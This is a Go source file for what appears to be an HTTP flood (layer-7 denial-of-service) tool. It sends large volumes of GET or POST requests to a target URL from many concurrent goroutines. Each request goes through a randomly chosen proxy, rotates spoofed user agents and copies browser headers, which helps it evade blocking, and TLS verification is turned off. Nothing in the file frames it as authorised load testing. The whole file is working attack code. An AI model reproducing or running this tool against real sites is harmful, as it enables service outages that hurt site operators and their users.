package main

import (
  "fmt"
  "io/ioutil"
  "strings"
  "os"
  "strconv"
  "math/rand"
  "net/http"
  "net/url"
  "log"
  "time"
  // "bytes"
  "crypto/tls"
)

func main() {
  rand.Seed(time.Now().UnixNano())
  args := os.Args
  var _URL, _PROXIES_FILE, _UAS_FILE, _METHOD, _POSTDATA, _COOKIE string
  var _TIME, _RATE, _THREADS int
  var _PROXIES, _USERAGENTS []string

  _POSTDATA = ""
  _COOKIE = ""

  for k, v := range args {
    if v == "-h" {
      _URL = args[k+1]
    }
    if v == "-p" {
      _PROXIES_FILE = args[k+1]
      _PROXIES = loadProxysList(_PROXIES_FILE)
    }
    if v == "-pd" {
      _POSTDATA = args[k+1]
    }
    if v == "-c" {
      _COOKIE = args[k+1]
    }
    if v == "-u" {
      _UAS_FILE = args[k+1]
      _USERAGENTS = loadUserAgentsList(_UAS_FILE)
    }
    if v == "-m" {
      _METHOD = args[k+1]
    }
    if v == "-t" {
      time, err := strconv.Atoi(args[k+1])
      if err == nil {
        _TIME = time
        } else {
          fmt.Println("Time is number")
        }
      }
      if v == "-r" {
        rate, err := strconv.Atoi(args[k+1])
        if err == nil {
          _RATE = rate
          } else {
            fmt.Println("Rate is number")
          }
        }
        if v == "-n" {
          thread, err := strconv.Atoi(args[k+1])
          if err == nil {
            _THREADS = thread
            } else {
              fmt.Println("Threads is number")
            }
          }
        }

        //DEBUG
        // fmt.Println(_URL)
        // fmt.Println(_PROXIES_FILE)
        // fmt.Println(_UAS_FILE)
        // fmt.Println(_METHOD)
        // fmt.Println(_TIME)
        // fmt.Println(_RATE)


        fmt.Println("Number of proxies :", len(_PROXIES))
        fmt.Println("Number of useragents :", len(_USERAGENTS))

        for count := 0; count < _THREADS; count++ {
          go prepareRequest(_URL, _METHOD, _PROXIES, _USERAGENTS, _RATE, _TIME, _POSTDATA, _COOKIE)
        }
        time.Sleep(time.Duration(_TIME) * time.Second)
      }

      func loadProxysList(path string) ( []string ) {
        data, err := ioutil.ReadFile(path)
        if err != nil {
          fmt.Println("File reading error", err)
        }
        list := string(data)
        s := strings.Split(list, "\n")
        return s
      }

      func loadUserAgentsList(path string) ( []string ) {
        data, err := ioutil.ReadFile(path)
        if err != nil {
          fmt.Println("File reading error", err)
        }
        list := string(data)
        s := strings.Split(list, "\n")
        for k,v := range s {
          s[k] = strings.ReplaceAll(v, "\r", "")
        }
        return s
      }

      func prepareRequest(_URL string, _METHOD string, _PROXIES []string, _USERAGENTS []string, _RATE int, _TIME int, _POSTDATA string, _COOKIE string)  {
        startTime := time.Now().Unix()
        stopTime := startTime + (int64(_TIME))
        for {
          currentTime := time.Now().Unix()
          if currentTime > stopTime {
            return
          }
          proxy := _PROXIES[rand.Intn(len(_PROXIES) - 1) + 1]
          useragent := _USERAGENTS[rand.Intn(len(_USERAGENTS) - 1) + 1]
          makeRequest(_URL, _METHOD, proxy, useragent, _RATE, _POSTDATA, _COOKIE)
        }
      }

      func makeRequest(host string, method string, proxy string, useragent string, _RATE int, _POSTDATA string, _COOKIE string)  {
        proxyURL, err := url.Parse("http://"+proxy)
        if err != nil {
          log.Println(err)
        }
        targetURL, err := url.Parse(host)
        if err != nil {
          log.Println(err)
        }

        if method == "GET" {
          // data = nil
        }
        req, err := http.NewRequest(method, targetURL.String(), nil)
        if err != nil {
          // lastErr = err.Error()
        }
if method == "POST" {
          m, err := url.ParseQuery(_POSTDATA)
          if err != nil {
            // lastErr = err.Error()
          }
          data := url.Values{}
          for k,v := range m {
            data.Set(k, v[0])
          }
          req, err = http.NewRequest(method, targetURL.String(), strings.NewReader(data.Encode()))
        }
        // Set headers
        req.Header.Set("Referer", targetURL.String())
        req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8")
        req.Header.Set("Accept-encoding", "gzip, deflate, br")
        req.Header.Set("Accept-language", "en-US,en;q=0.9,he-IL;q=0.8,he;q=0.7,tr;q=0.6")
        req.Header.Set("Cache-Control", "no-cache")
        req.Header.Set("Pragma", "no-cache")
        req.Header.Set("Upgrade-Insecure-Requests", "1")
        req.Header.Set("User-Agent", useragent)
        if method == "POST" {
          req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
        }

        if _COOKIE != "" {
          m, err := url.ParseQuery(_COOKIE)
          if err != nil {
            // lastErr = err.Error()
          }
          for k,v := range m {
            cookie := http.Cookie{Name: k, Value: v[0]}
            req.AddCookie(&cookie)
          }
        }

        client := &http.Client{}
        if targetURL.Scheme == "https" {
          //Skip certificate verify for performance
          secureTransport := &http.Transport{
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
            Proxy: http.ProxyURL(proxyURL),
            MaxIdleConns: 20000,
            IdleConnTimeout: 60 * time.Second,
            MaxConnsPerHost: 5000,
          }
          client = &http.Client{Timeout: time.Second * 10, Transport: secureTransport}
          } else {
            transport := &http.Transport{
              Proxy: http.ProxyURL(proxyURL),
              MaxIdleConns: 20000,
              IdleConnTimeout: 60 * time.Second,
              MaxConnsPerHost: 5000,
            }
            client = &http.Client{Timeout: time.Second * 10, Transport: transport}
          }

          for count := 0; count < _RATE; count++ {
            resp, err := client.Do(req)
            if err != nil {
              return
            }
            defer resp.Body.Close()
          }
        }


